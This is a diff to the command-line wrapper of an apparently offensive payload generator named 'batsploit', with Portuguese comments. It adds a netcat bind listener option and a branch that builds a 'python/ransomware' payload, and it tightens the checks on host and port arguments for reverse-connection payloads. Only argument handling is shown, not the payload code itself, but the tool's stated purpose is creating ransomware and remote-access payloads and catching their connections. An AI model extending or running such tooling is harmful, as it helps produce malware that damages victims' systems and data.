@@ -24,7 +24,7 @@ else:
 			batsploit.usage_bind(sys.argv[0]) # mostra como o bind é usado
 		elif sys.argv[1] == "-payload":
 			batsploit.usage_payload(sys.argv[0]) # mostra como o create payloads é usado
-	elif len(sys.argv) >= 4:
+	elif len(sys.argv) >= 2:
 		if sys.argv[1] == "-bind":
 			lhost = sys.argv[2] # local host para escutar a conexão dos payloads
 			lport = sys.argv[3] # local port para escutar a conexão dos payloads
@@ -32,13 +32,29 @@ else:
 				batsploit.usage_bind(sys.argv[0]) # mostra como o bind é usad
 			else:
 				batsploit.bind(lhost, lport)
-		if sys.argv[1] == "-payload":
+		elif sys.argv[1] == "-nc_bind":
+			lhost = sys.argv[2] # local host para escutar a conexão dos payloads
+			lport = sys.argv[3] # local port para escutar a conexão dos payloads
+			if "=" not in lhost or "=" not in lport:
+				batsploit.usage_nc_bind(sys.argv[0]) # mostra como o bind é usad
+			else:
+				batsploit.nc_bind(lhost, lport)
+		if sys.argv[1] == "-payload" and sys.argv[2] == "python/ransomware":
+			if len(sys.argv) <= 4:
+				payload = sys.argv[2]
+				try:
+					name = sys.argv[3]
+				except IndexError:
+					batsploit.usage_payload_ransomware(sys.argv[0])
+					sys.exit()
+				batsploit.create_payload(payload, 'data="data"', 'size=0', name)
+				sys.exit()
 			if len(sys.argv) == 6:
 				payload = sys.argv[2]
 				lhost = sys.argv[3] # local host para o payload se conectar
 				lport = sys.argv[4] # local port para o pauload se conectar
 				name = sys.argv[5] # nome do payload
-				if "=" not in lhost or "=" not in lport:
+				if "=" not in lhost or "=" not in lport or not lhost or not lport:
 					batsploit.usage_payload(sys.argv[0])  # mostra como o create payloads é usado
 				else:
 					batsploit.create_payload(payload, lhost, lport, name)
